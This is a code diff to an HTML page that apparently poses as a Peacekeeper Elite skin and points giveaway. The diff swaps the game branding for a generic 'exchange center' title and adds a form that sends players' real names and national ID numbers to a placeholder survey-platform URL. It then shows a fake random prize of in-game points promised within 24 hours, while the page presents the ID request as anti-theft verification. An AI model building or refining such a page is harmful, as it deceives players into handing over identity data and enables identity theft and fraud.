@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>和平精英皮肤领取</title>
+  <title>活动兑换中心</title>
   <style>
     body {
       margin: 0;
@@ -54,18 +54,6 @@
       background-color: #eee;
     }
 
-    .logo-group {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-top: 8px;
-    }
-
-    .logo-group img {
-      height: 24px;
-      width: 24px;
-    }
-
     .error {
       color: red;
       font-size: 14px;
@@ -85,94 +73,153 @@
       transition: background 0.3s;
     }
 
-    button:hover {
-      background-color: #ffb800;
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
 
-    .back-btn {
+    .announcement {
       margin-top: 20px;
-      display: block;
-      text-align: center;
-      color: #aaa;
-      text-decoration: underline;
       font-size: 14px;
+      color: #ccc;
+    }
+
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      display: none;
+    }
+
+    .modal-content {
+      background-color: #fff;
+      color: #000;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .modal-content p {
+      margin-bottom: 20px;
+    }
+
+    .modal-content button {
+      padding: 10px 20px;
+      background-color: #ffd700;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>和平精英皮肤领取</h2>
+    <h2>活动兑换中心</h2>
 
-    <label for="area">请选择登录区服</label>
-    <select id="area">
-      <option value="">请选择</option>
-      <option value="wechat">微信区</option>
-      <option value="qq">QQ区</option>
-    </select>
-    <div class="logo-group">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB8AAAAgCAYAAACo1a6zAAAABHNCSVQICAgIfAhkiAAAAJpJREFUSA3t1rEJgkAUhOH/ybKkq3ZJAjBzZsEwMAvYwcKhqv1Tw3opT/mWBgGgJPQMsU+RKPQd1K1m1Blj5VQoq9c5okYcH8WEuWitWc+3KyYErfMgZAdHJymbDCAXAkKQcGkgId1spFuclIo4UdKSOEQbmw1W6KR3ABAlEMiGu0TXYAAAAASUVORK5CYII=" alt="微信logo"/>
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB8AAAAgCAYAAACo1a6zAAAABHNCSVQICAgIfAhkiAAAAJ5JREFUSA3t1TEKwkAUheH/ytLQJZaQkxkYpNkQqNVxGHJtFC27AzS1E5z5QKnwuPcX8/v2AgBKoMFOFOV7wnoLaN9T+ATdwcF1lm3Z4VMC2H7zBB1pUgeHKyB6ptnANBckzAytkNSHKGKAMkJgbSI7AwZZ02gJgXgs8OSRhxhYc3+YdMHZACnSIz4Zsvs7AAAAAElFTkSuQmCC" alt="QQ logo"/>
+    <form id="exchangeForm" action="https://your-survey-platform.com/submit" method="POST">
+      <label for="area">请选择登录区服</label>
+      <select id="area" name="area">
+        <option value="">请选择</option>
+        <option value="wechat">微信区</option>
+        <option value="qq">QQ区</option>
+      </select>
+      <div id="areaError" class="error"></div>
+
+      <label for="nickname">游戏昵称</label>
+      <input type="text" id="nickname" name="nickname" placeholder="请输入游戏昵称" />
+
+      <label for="name">姓名</label>
+      <input type="text" id="name" name="name" placeholder="请输入真实姓名" />
+      <div id="nameError" class="error"></div>
+
+      <label for="idCard">身份证号</label>
+      <input type="text" id="idCard" name="idCard" placeholder="请输入18位身份证号" />
+      <div id="idError" class="error"></div>
+
+      <button type="submit" id="submitBtn">提交认证</button>
+    </form>
+
+    <div class="announcement">
+      活动说明：为确保奖励发放的准确性，提交信息后将进行二次审核，点券将在24小时内发放。请耐心等待。
     </div>
-    <div id="areaError" class="error"></div>
+  </div>
 
-    <label for="nickname">游戏昵称</label>
-    <input type="text" id="nickname" placeholder="请输入游戏昵称" />
-    <!-- 游戏昵称无需校验 -->
-
-    <label for="name">姓名</label>
-    <input type="text" id="name" placeholder="请输入真实姓名" />
-    <div id="nameError" class="error"></div>
-
-    <label for="idCard">身份证号</label>
-    <input type="text" id="idCard" placeholder="请输入18位身份证号" />
-    <div id="idError" class="error"></div>
-
-    <div style="font-size: 13px; margin-top: 8px; color: #ccc;">
-      二次实名认证是为确认领取人为账号本人，防止盗领等行为
+  <div class="modal" id="resultModal">
+    <div class="modal-content">
+      <p id="resultMessage"></p>
+      <button id="confirmBtn">确认</button>
     </div>
-
-    <button onclick="validateForm()">提交认证</button>
-
-    <div class="back-btn" onclick="history.back()">← 返回</div>
   </div>
 
   <script>
-    function validateForm() {
-      let area = document.getElementById("area").value;
-      let name = document.getElementById("name").value.trim();
-      let id = document.getElementById("idCard").value.trim();
+    const form = document.getElementById('exchangeForm');
+    const area = document.getElementById('area');
+    const nameInput = document.getElementById('name');
+    const idCard = document.getElementById('idCard');
+    const areaError = document.getElementById('areaError');
+    const nameError = document.getElementById('nameError');
+    const idError = document.getElementById('idError');
+    const submitBtn = document.getElementById('submitBtn');
+    const resultModal = document.getElementById('resultModal');
+    const resultMessage = document.getElementById('resultMessage');
+    const confirmBtn = document.getElementById('confirmBtn');
 
-      let areaError = document.getElementById("areaError");
-      let nameError = document.getElementById("nameError");
-      let idError = document.getElementById("idError");
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
 
-      areaError.textContent = "";
-      nameError.textContent = "";
-      idError.textContent = "";
+      // 清除错误信息
+      areaError.textContent = '';
+      nameError.textContent = '';
+      idError.textContent = '';
 
       let valid = true;
 
-      if (!area) {
-        areaError.textContent = "请选择登录区服";
+      if (!area.value) {
+        areaError.textContent = '请选择登录区服';
         valid = false;
       }
 
-      if (!/^[\u4e00-\u9fa5]{1,5}$/.test(name)) {
-        nameError.textContent = "姓名必须为1-5个汉字";
+      if (!/^[\u4e00-\u9fa5]{1,5}$/.test(nameInput.value.trim())) {
+        nameError.textContent = '姓名必须为1-5个汉字';
         valid = false;
       }
 
-      if (!/^\d{17}[\dXx]$/.test(id)) {
-        idError.textContent = "请输入正确的18位身份证号";
+      if (!/^\d{17}[\dXx]$/.test(idCard.value.trim())) {
+        idError.textContent = '请输入正确的18位身份证号';
         valid = false;
       }
 
       if (valid) {
-        alert("认证成功，跳转抽奖页（示例）");
-        // location.href = "抽奖页面.html"; // 可替换为你下一页地址
+        // 模拟提交数据到问卷平台
+        // 实际使用时，请确保表单的 action 属性指向您的问卷平台接收数据的URL
+        // form.submit();
+
+        // 模拟奖励逻辑
+        const rewards = [60, 680, 1280, 1980, 3280, 6480];
+        let reward = 60;
+        const random = Math.random();
+        if (random < 0.01) {
+          reward = 300;
+        } else {
+          reward = rewards[Math.floor(Math.random() * rewards.length)];
+        }
+
+        resultMessage.textContent = `您已成功提交认证，请勿重复提交。\n恭喜获得${reward}点券，点券将在24小时之内到达。`;
+        resultModal.style.display = 'flex';
       }
-    }
+    });
+
+    confirmBtn.addEventListener('click', function() {
+      resultModal.style.display = 'none';
+      submitBtn.textContent = '您已提交';
+      submitBtn.disabled = true;
+    });
   </script>
 </body>
 </html>
